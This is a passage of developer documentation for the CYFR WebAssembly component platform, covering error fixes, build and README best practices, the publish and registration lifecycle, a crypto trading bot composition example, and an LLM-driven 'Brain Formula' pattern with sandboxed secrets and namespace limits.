**Error**: `{"error": {"type": "rate_limited", "message": "..."}}`

**Cause**: Too many requests in the rate limit window.

**Fix**: Wait for the rate limit window to reset. To increase limits, update the policy:
```bash
cyfr policy set c:local.my-catalyst:1.0 rate_limit '{"max_requests": 100, "window_seconds": 60}'
```

#### EXECUTION_TIMEOUT

**Error**: Component exceeded time limit.

**Cause**: Component took longer than the configured timeout (default: 10s).

**Fix**: Optimize the component logic, or increase the timeout via policy.

#### SECRET_DENIED

**Error**: `Err("access-denied: API_KEY not granted to my-catalyst:1.0")`

**Cause**: Secret not granted to this component.

**Fix**:
```bash
cyfr secret grant c:local.my-catalyst:1.0 API_KEY
```

---

## Best Practices

### Keep Reagents Pure

Reagents should be deterministic. Avoid:
- Current time/date
- Random numbers (use seeded RNG if needed)
- Environment variables
- Any I/O operations

### Minimize Binary Size

Smaller binaries load faster and have lower memory overhead.

```toml
# Cargo.toml
[profile.release]
opt-level = "s"      # Optimize for size
lto = true           # Link-time optimization
codegen-units = 1    # Better optimization
strip = true         # Strip symbols
```

### Clean Up Build Artifacts

Rust `target/` directories can reach 500MB–2GB per component. After copying the compiled `.wasm` binary, remove `target/` to reclaim disk space:

```bash
# From the component's src/ directory
cargo clean
```

If you're building multiple components locally, this adds up quickly. The `.gitignore` already excludes `target/`, but the directories still consume local disk until removed.

### Handle Errors Gracefully

Return structured JSON errors, not panics:

```rust
// Good — return error as JSON
serde_json::json!({"error": "Expected 'name' field"}).to_string()

// Bad
panic!("Invalid input!")
```

### Test Before Import

Always validate locally:

```bash
# Validate structure
wasm-tools validate component.wasm

# Check exports
wasm-tools component wit component.wasm

# Run local tests
cargo test
```

---

## Component README

A `README.md` alongside the WASM binary is recommended for every component. While the manifest (`cyfr-manifest.json`) is machine-readable, the README provides human-readable context that schemas alone cannot convey.

Think of these as complementary layers:

- **Manifest** (`cyfr-manifest.json`): machine-readable contract — schemas, examples, capabilities, secrets. This is what tooling and agents read.
- **README** (`README.md`): human-readable companion — why to use it, how to get API keys, known gotchas, migration notes. This is what humans read when schemas aren't enough.

### What to Include

| Section | Description |
|---------|-------------|
| **Overview** | What the component does in plain language |
| **Supported Operations** | List of operations/functions the component handles |
| **Example Input/Output** | Copy-pasteable JSON payloads showing real usage |
| **Required Secrets** | Which secrets to grant and how to obtain them |
| **Usage (CLI & MCP)** | How to run the component via `cyfr run` and via MCP JSON-RPC (`POST /mcp`). Show copy-pasteable examples for the most common operations. |
| **Setup** | What `cyfr setup` configures: required secrets and recommended policy values |
| **Known Limitations** | Rate limits, unsupported features, platform constraints |

### Template

```markdown
# {Component Name}

{One-sentence description of what this component does.}

## Operations

- `operation.name` — What it does
- `other.operation` — What it does

## Example

**Input:**
\```json
{ "operation": "example.create", "params": { ... } }
\```

**Output:**
\```json
{ "status": 200, "data": { ... } }
\```

## Usage

### CLI

```bash
cyfr run c:namespace.name:version --input '{"operation": "...", "params": {...}}'
```

### MCP

```bash
curl -X POST http://localhost:4000/mcp \
  -H "Content-Type: application/json" \
  -H "MCP-Protocol-Version: 2025-11-25" \
  -H "Authorization: Bearer cyfr_sk_..." \
  -d '{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tools/call",
    "params": {
      "name": "execution",
      "arguments": {
        "action": "run",
        "reference": {"registry": "type:namespace.name:version"},
        "input": {"operation": "...", "params": {}},
        "type": "catalyst"
      }
    }
  }'
```

## Secrets

| Secret | Description | How to Obtain |
|--------|-------------|---------------|
| `API_KEY` | API authentication key | Sign up at ... |

## Setup

Run `cyfr setup c:namespace.name:version` to configure secrets and policy.

| Setup Item | Type | Description |
|------------|------|-------------|
| `API_KEY` secret | required | API authentication key |
| `allowed_domains` policy | recommended | `["api.example.com"]` |

## Limitations

- ...
```

---

## Publishing Checklist

Before publishing a component to the registry, verify:

- [ ] WASM binary passes `build.validate` (valid WASM, correct exports, no forbidden imports)
- [ ] `cyfr-manifest.json` present with required fields (`id`, `type`, `version`, `description`)
- [ ] Capability declarations in manifest match actual WASM imports (e.g., if your WIT imports `cyfr:http/fetch`, manifest has `wasi.http: true`)
- [ ] Input/output schemas defined in manifest (`schema.input`, `schema.output`)
- [ ] Setup section declares required secrets (`setup.secrets`) with descriptions
- [ ] Setup section declares recommended policy (`setup.policy`) if the component needs host policy
- [ ] Examples in manifest for common operations (recommended)
- [ ] `README.md` with usage examples (recommended)
- [ ] Tested via draft workflow with representative input
- [ ] **Catalysts only**: Host Policy set with `allowed_domains` and secrets granted

---

## Component Lifecycle

A component moves through distinct stages from source code to production execution. Each stage is handled by a specific service:

```
Build -> Validate -> Register -> Test (draft) -> Publish -> Pull -> Setup -> Execute
         Locus      Compendium   Opus          Compendium  Compendium  Setup   Opus
```

| Stage | What Happens | Service | Command |
|-------|-------------|---------|---------|
| **Build** | Compile source to WASM binary | External (cargo, tinygo, etc.) | `cargo component build --release` |
| **Validate** | Check binary against component spec (exports, imports, size) | Locus | `build.validate` action |
| **Register** | Scan and register local/agent components for discovery | Compendium | `cyfr register` |
| **Test** | Import as ephemeral draft, run with sample input | Opus | `cyfr run draft:<id>` |
| **Publish** | Persist to storage, sign with Sigstore, push to registry | Compendium | `component.publish` |
| **Pull** | Download from registry to local `components/` directory | Compendium | `cyfr pull <reference>` |
| **Setup** | Apply manifest-declared secrets and policy via `cyfr setup`; grant secrets | Sanctum + Arca | `cyfr setup`, `cyfr secret grant` |
| **Execute** | Run component in sandboxed WASM runtime with policy enforcement | Opus | `cyfr run <reference>` |

**The manifest (`cyfr-manifest.json`) is present from Build onward.** It is created alongside the source code during development, validated during import, and packaged into the OCI artifact during publish.

> **See also**: [Locus docs](docs/services/locus.md) for validation details, [Compendium docs](docs/services/compendium.md) for publishing and registry, [Opus docs](docs/services/opus.md) for runtime execution.

---

## Registering Components

Components must be known to Compendium (the SQLite registry) for discovery via `component.search` and resolution via `{"registry": "name:version"}`. There are two ways components enter the registry:

### `register` vs `publish`

| Operation | Who | Trust | Overwrite? | Enters via |
|-----------|-----|-------|------------|------------|
| `register` | Developer | `:local` (unsigned) | Always | `cyfr register` (filesystem scan) |
| `publish` | Verified identity | `:signed` / `:sigstore` | Never (non-local) | Explicit action + signature |

Both write to the same SQLite `components` table. A `source` field distinguishes them:
- `"filesystem"` — registered from `local/` or `agent/` directories via `cyfr register`
- `"published"` — explicitly published via `component.publish`

### How Registration Works

When you run `cyfr register`, the system scans all component directories and for each discovered component:

1. Reads the `cyfr-manifest.json` for metadata (type, version, description, tags)
2. Infers name and version from the directory path if not in manifest
3. Validates the WASM binary via Locus
4. Compares the digest with any existing SQLite entry — skips if unchanged
5. Registers the component with `source: "filesystem"`
6. Prunes stale entries where the directory no longer exists on disk

### Security: Namespace Guard

Registration enforces namespace restrictions:
- **Only** `local/` and `agent/` publisher namespaces are scanned
- **Ignores** components under other publisher names (e.g., `stripe/`, `cyfr/`)
- Only `publish` with proper identity verification can create named-publisher entries

### Running Registration

```bash
# Scan and register all local/agent components
cyfr register

# Via MCP
{"tool": "component", "action": "register"}
```

### Search Results

The `source` field appears in search results, so you can distinguish trust levels:
```
my-api:0.1.0 (catalyst) [filesystem] — Example API bridge
stripe:1.0.0 (catalyst) [published]  — Stripe payment processing
```

---

## Real-World Example: Composition in Action

This example shows how a Formula orchestrates multiple components to build a crypto trading bot:

```
+---------------------------------------------------------------+
|  Formula: crypto_bot:1.0 (orchestrates workflow via host calls)  |
+---------------------------------------------------------------+
|  1. invoke("twitter_api:1.0", ...) -> raw tweets                 |
|  2. invoke("sentiment_analyzer:3.5", ...) -> sentiment score     |
|  3. invoke("strategy_rsi:1.0", ...) -> buy/sell signal           |
|  4. If bullish: invoke("binance_api:2.0", ...) -> execute trade  |
+---------------------------------------------------------------+
```

### How It Works

A Formula is a WASM binary with **internal orchestration logic** — loops, conditionals, branching all live inside the WASM. When it needs to invoke a sub-component, it calls the `cyfr:formula/invoke.call` host function. Opus intercepts this call, executes the referenced component in its own sandbox, and returns the result to the Formula.

```rust
// Pseudocode — inside the Formula's WASM binary
use cyfr::formula::invoke;

fn run(input: String) -> String {
    // Step 1: Fetch tweets (Catalyst — has HTTP access)
    let tweets = invoke::call(&json!({
        "reference": {"registry": "catalyst:cyfr.twitter-api:1.0"},
        "input": {"query": "$BTC", "count": 100},
        "type": "catalyst"
    }).to_string());

    // Step 2: Analyze sentiment (Reagent — pure compute)
    let sentiment = invoke::call(&json!({
        "reference": {"registry": "reagent:cyfr.sentiment-analyzer:3.5"},
        "input": {"texts": tweets},
        "type": "reagent"
    }).to_string());

    // Step 3: Compute trading signal (Reagent — pure compute)
    let signal: serde_json::Value = serde_json::from_str(&invoke::call(&json!({
        "reference": {"registry": "reagent:cyfr.strategy-rsi:1.0"},
        "input": {"sentiment": sentiment, "prices": tweets},
        "type": "reagent"
    }).to_string())).unwrap();

    // Step 4: Conditional execution — only trade if bullish
    if signal["action"] == "buy" {
        invoke::call(&json!({
            "reference": {"registry": "catalyst:cyfr.binance-api:2.0"},
            "input": {"symbol": "BTCUSDT", "side": "BUY", "quantity": signal["position_size"]},
            "type": "catalyst"
        }).to_string())
    } else {
        json!({"action": "hold", "reason": signal["reason"]}).to_string()
    }
}
```

### Component Responsibilities

| Component | Type | I/O? |
|-----------|------|------|
| `crypto_bot:1.0` | Formula | No (invokes sub-components) |
| `twitter_api:1.0` | Catalyst | Yes (HTTP) |
| `sentiment_analyzer:3.5` | Reagent | No |
| `strategy_rsi:1.0` | Reagent | No |
| `binance_api:2.0` | Catalyst | Yes (HTTP) |

### Why This Pattern

1. **Pure Logic in Reagents**: Sentiment analysis and RSI strategy are deterministic—same inputs always produce same outputs. No network access means no exfiltration risk.

2. **I/O Isolated in Catalysts**: Only the API connectors (Twitter, Binance) have network access, and they're constrained by Host Policy (`allowed_domains`).

3. **Formula as Glue**: The orchestration logic runs inside WASM but can only interact with the outside world through `cyfr:formula/invoke`. Even if the Formula is malicious, it can only call other components — each of which runs in its own sandbox with its own policy enforcement.

4. **Runtime Enforces Everything**: Opus validates signatures, enforces policies, and executes each sub-component in isolation. The Formula never gets direct access to HTTP, secrets, or filesystem.

### Parallel Variant

Steps 2 and 3 (sentiment analysis + RSI strategy) are independent — they can run in parallel using `call-batch`:

```rust
// Steps 2+3 run concurrently instead of sequentially
let batch_response = invoke::call_batch(&json!({
    "invocations": [
        {
            "reference": {"registry": "reagent:cyfr.sentiment-analyzer:3.5"},
            "input": {"texts": tweets},
            "type": "reagent"
        },
        {
            "reference": {"registry": "reagent:cyfr.strategy-rsi:1.0"},
            "input": {"sentiment": tweets, "prices": tweets},
            "type": "reagent"
        }
    ]
}).to_string());

let batch: serde_json::Value = serde_json::from_str(&batch_response).unwrap();
let handle = batch["batch"].as_str().unwrap();

// Wait for both to complete
loop {
    let poll: serde_json::Value = serde_json::from_str(
        &invoke::poll_all(&json!({"batch": handle}).to_string())
    ).unwrap();
    if poll["all_done"].as_bool().unwrap_or(false) {
        invoke::close(&json!({"batch": handle}).to_string());
        let sentiment = &poll["results"][0]["output"];
        let signal = &poll["results"][1]["output"];
        // Continue with step 4...
        break;
    }
}
```

---

## Brain Formula Pattern

A **Brain Formula** uses LLM reasoning combined with `cyfr:mcp/tools` to dynamically discover, generate, and invoke components at runtime. This enables agent-driven workflows where the logic adapts based on what components exist.

### Flow

```
User Request: "Analyze the sentiment of these tweets"
    ↓
Brain calls LLM Catalyst for reasoning
    ↓
LLM returns: "I need a sentiment analyzer"
    ↓
Brain calls: mcp.call("component.search", {query: "sentiment"})
    ↓
If found → invoke it directly
If not found → Brain asks LLM to generate Go source
    ↓
Brain calls: mcp.call("build.compile", {source: "...", language: "go", target: "reagent"})
    ↓
Locus compiles via TinyGo → returns {local: "components/reagents/agent/gen-xyz/..."}
    ↓
Brain calls: invoke({local: "..."}, input)
    ↓
Result returned to user
```

### Example Policy

Brain Formulas require Host Policy with `mcp.allowed_tools`:

```yaml
mcp:
  allowed_tools:
    - "component.search"    # Discover from registry
    - "component.pull"      # Pull from registry
    - "build.compile"       # Compile Go → agent/ namespace
    - "secret.list"         # See available secrets (not read)
    - "storage.read"
    - "storage.write"
  storage:
    paths: ["brain/*"]
```

### Secrets Model

The Brain can **list** secrets but not read values:

```
// Allowed: see what secrets exist
mcp.call("secret.list", {})
→ {"secrets": ["MY_API_KEY", "STRIPE_KEY"]}

// Blocked: reading values
mcp.call("secret.get", {name: "MY_API_KEY"})
→ {"error": {"type": "access-denied"}}
```

To use secrets, the Brain invokes a Catalyst that has the secret granted.

### Namespace Access

| Namespace | Brain Access | Purpose |
|-----------|--------------|---------|
| `agent/` | **Read + Write + Run** | Brain-generated components |
| `local/` | Read + Run only | Human dev components |
| `cyfr/` (registry) | Search + Pull + Run | Published components |

> **Trust Boundary**: The Brain can only write to `agent/`. This isolates agent-generated code from human-developed and registry-pulled components.

